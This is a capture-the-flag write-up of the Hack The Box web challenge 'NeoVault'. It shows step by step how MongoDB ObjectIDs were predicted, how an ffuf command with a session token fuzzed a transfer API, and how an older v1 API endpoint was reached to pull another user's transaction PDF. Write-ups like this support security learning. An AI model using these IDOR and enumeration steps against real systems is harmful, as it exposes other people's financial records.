---
title: 'HackTheSystem: NeoVault'
author: lict
categories: [HackTheBox]
tags: [web, mongodb, mongo-object-prediction, IDOR, api-v1]
render_with_liquid: false
media_subpath: /images/hackthesystem_neovault/
---

The challenge description:
```
Neovault is a trusted banking application that allows users to effortlessly transfer funds to one another and conveniently download their transaction history. We invite you to explore the application for any potential vulnerabilities and uncover the flag hidden within its depths.
```

This challenge greets us with login/registration form, pretty much as well as `JinjaCare` does, so I made an account and signed in. We have an hint from challenge makers that it has to be an `IDOR`, so I made another account to test on it:

```
lict101 | lict@gmail.com <- this is the main account
lict102 | lict2@gmail.com <- this is the second account
```

Let's transfer some money and see what happens:
![20250629174337.png](20250629174337.png)

As we can notice, the `toUserId` parameter is a `Mongo Object ID`, we had that hint from the challenge's description too.

When I visited the `Transactions` tab, I noticed that my browser sends this specific request and gets an answer containing the `neo_system` user's `Object ID`:
![20250629174622.png](20250629174622.png)

We can use that `Object ID` as a *starting point* to predict other IDs. To do that, we will use the [mongo-objectid-predict](https://github.com/andresriancho/mongo-objectid-predict/) tool:

```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/andresriancho/mongo-objectid-predict/
Cloning into 'mongo-objectid-predict'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26 (from 1)
Receiving objects: 100% (26/26), 6.70 KiB | 2.23 MiB/s, done.
Resolving deltas: 100% (8/8), done.
                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ cd mongo-objectid-predict 
```

At this point, I think many people faced the same problem as I did, so I will cover the fix for this tool too. To make it work, simply edit the first line on the `mongo-objectid-predict` file, turning `#!/usr/bin/env python` to `#!/usr/bin/env python2`. Now, let's make the prediction:

```
┌──(kali㉿kali)-[/tmp/mongo-objectid-predict]
└─$ ./mongo-objectid-predict 686141492e9156af06817d39 > predict.txt 
```

The ID I used as an argument is `neo_system`'s user ID which can be found in the request I showed above. Now, let's enumerate other users using fuzzing with the `wordlist` we just made. Let's use `ffuf` to make it faster:

```
──(kali㉿kali)-[/tmp/mongo-objectid-predict]
└─$ ffuf -X POST -u "http://94.237.57.211:36092/api/v2/transactions" -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4NjE0MWIyMmU5MTU2YWYwNjgxN2Q0NyIsImlhdCI6MTc1MTIwNDUyOCwiZXhwIjoxNzUxMjA4MTI4fQ.Bkal226ceg6QRGvJnbE17_XhHz4DuGwDIQq_SOPK4_A" -d '{"toUserId":"FUZZ","amount":1,"description":"123","category":"Shopping"}' -w predict.txt -H "Content-Type: application/json 
dquote> "

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.57.211:36092/api/v2/transactions
 :: Wordlist         : FUZZ: /tmp/mongo-objectid-predict/predict.txt
 :: Header           : Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4NjE0MWIyMmU5MTU2YWYwNjgxN2Q0NyIsImlhdCI6MTc1MTIwNDUyOCwiZXhwIjoxNzUxMjA4MTI4fQ.Bkal226ceg6QRGvJnbE17_XhHz4DuGwDIQq_SOPK4_A
 :: Header           : Content-Type: application/json
 :: Data             : {"toUserId":"FUZZ","amount":1,"description":"123","category":"Shopping"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

686141492e9156af06817d3e [Status: 201, Size: 48, Words: 3, Lines: 1, Duration: 190ms]
:: Progress: [1140/1140] :: Job [1/1] :: 429 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Excellent, we got a hit! I navigated to the `Transactions` tab again to see if we already have the flag, but it just confirmed that I am on the right track:

![20250629175554.png](20250629175554.png)
I noticed that I exploited `MongoDB Object ID Prediction` but `IDOR` is still there. As the challenge's description suggests, the answer might be in `PDF download` feature. When we click it, it sends the following request:
![20250629175800.png](20250629175800.png)

The request goes to: `http://94.237.57.211:36092/api/v2/transactions/download-transactions`. Looks pretty normal, right? But what if we try `http://94.237.57.211:36092/api/v1/transactions/download-transactions` instead?

I changed `v2` to `v1` to see if the previous version of API is still there and the server answered!
![20250629175946.png](20250629175946.png)

Let's send the `_id` we got from `ffuf` to see if we can download their transaction history:
![20250629180111.png](20250629180111.png)

The error says we should send a JSON payload, let's do that:
![20250629180202.png](20250629180202.png)

It worked! Now I just need to copy the result we got and run the following command on my running machine:

```
┌──(kali㉿kali)-[/tmp/mongo-objectid-predict]
└─$ echo "JVBERi0xLjMKJf////8KNyAwIG9iago8PAovVHlwZSAvUGFnZQovUGFyZW50IDEgMCBSCi9NZWRpYUJveCBbMCAwIDYxMiA3OTJdCi9Db250ZW50cyA1IDAgUgovUmVzb3VyY2VzIDYgMCBSCj4+CmVuZG9iago2IDAgb2JqCjw8Ci9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXQovRm9udCA8PAovRjEgOCAwIFIKL0YyIDkgMCBSCj4+Ci9Db2xvclNwYWNlIDw8Cj4+Cj4+CmVuZG9iago1IDAgb2JqCjw8Ci9MZW5ndGggNjg1Ci9GaWx0ZXIgL0ZsYXRlRGVjb2RlCj4+CnN0cmVhbQp4nLVXsW7jSAzt9RXzA5kj+chHCTBcLLBXXLc4d4crdh2p2hRX5fcPo8hJFpaSKMkWhqSR/fjmPXJIa5Ei5UaLlBysnO+6/zq9WvtyWha1aHqllbSs9HK66/74U4tJOU3dPwcfGZyCx5JSDtQMntNN3Fx99B8mgfBjUZNycF1uwj381sPH9k7+Lae/uq+n7ttrVNy8Wl/Y9zX6CxVdqATSqekM3jI4zjSWFXw/lpByMPHvx0b+kMGRYQLDYOf52j5xRee+CylqQ3WWu06HqIBdFn52f7/OOqSQXsUe1VNb1FOC4JQXuj0nnumMNBMfOJLHgqbslHYsNxblwNt5TwMnjnvEazRCa/TXykWihbwEGKlNwifRcvlCTJkc0tnHRPJMZe6kEL3X3h4Y2CODi097wBSbaGx7sVk23u7BNN3CbInaz4i78IYXdtxERRqHlHf52YoBW/DNwSWvfgENKaZR7rpY7loKv8G2eIrylDigTXMBTZvl85qBq7g8cyDSoRDobgNXMT8rh2dL19VQGLDLQrcavglnIwSyt8DwglP2AadWcT9NVf3tEYatCN6Hu+UPjpD0mBKQmABqIoeYoHRIYwBFEiABwGEtP3dzMFTjlT9Co9Oo8Bm7x4BkgGxZlRAMCDgVzF1HWljUnltpoW0nyPdlmrDmb0i0NVg+zBlTcyTx0OR359ca8Kem11qAyKWDB8+t17fOas3t+bjXeRRJmMytIOiNxHv8XTXjZXvvO++lwLTK3BHQV/Ly/KbRpv3e06ps9ss0KscEtR3oD13ONqnA6jBTsajMy/PbqVCqXlNBtpGwjU1txJklH3aNnQ0arLiqn8fRllMbPnk28Wc+Jp5mqN0BzWtenRPmkP3FOuMp6pv4t9qyD7MXffZv4Rl7azMPYmUP/wMS35MMCmVuZHN0cmVhbQplbmRvYmoKMTEgMCBvYmoKKFBERktpdCkKZW5kb2JqCjEyIDAgb2JqCihQREZLaXQpCmVuZG9iagoxMyAwIG9iagooRDoyMDI1MDYyOTE0MDIwMFopCmVuZG9iagoxMCAwIG9iago8PAovUHJvZHVjZXIgMTEgMCBSCi9DcmVhdG9yIDEyIDAgUgovQ3JlYXRpb25EYXRlIDEzIDAgUgo+PgplbmRvYmoKOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKPj4KZW5kb2JqCjQgMCBvYmoKPDwKPj4KZW5kb2JqCjMgMCBvYmoKPDwKL1R5cGUgL0NhdGFsb2cKL1BhZ2VzIDEgMCBSCi9OYW1lcyAyIDAgUgo+PgplbmRvYmoKMSAwIG9iago8PAovVHlwZSAvUGFnZXMKL0NvdW50IDEKL0tpZHMgWzcgMCBSXQo+PgplbmRvYmoKMiAwIG9iago8PAovRGVzdHMgPDwKICAvTmFtZXMgWwpdCj4+Cj4+CmVuZG9iagp4cmVmCjAgMTQKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAxNDM3IDAwMDAwIG4gCjAwMDAwMDE0OTQgMDAwMDAgbiAKMDAwMDAwMTM3NSAwMDAwMCBuIAowMDAwMDAxMzU0IDAwMDAwIG4gCjAwMDAwMDAyMzYgMDAwMDAgbiAKMDAwMDAwMDExOSAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDExNTUgMDAwMDAgbiAKMDAwMDAwMTI1MiAwMDAwMCBuIAowMDAwMDAxMDc5IDAwMDAwIG4gCjAwMDAwMDA5OTMgMDAwMDAgbiAKMDAwMDAwMTAxOCAwMDAwMCBuIAowMDAwMDAxMDQzIDAwMDAwIG4gCnRyYWlsZXIKPDwKL1NpemUgMTQKL1Jvb3QgMyAwIFIKL0luZm8gMTAgMCBSCi9JRCBbPDEwNGNhYzljMmU4YmRmZjg2MTlmNWI0NzZjOWE5ZjIzPiA8MTA0Y2FjOWMyZThiZGZmODYxOWY1YjQ3NmM5YTlmMjM+XQo+PgpzdGFydHhyZWYKMTU0MQolJUVPRgo=" | base64 -d > flag.pdf; open flag.pdf
```

As we can see, the flag is there:
![20250629180410.png](20250629180410.png)

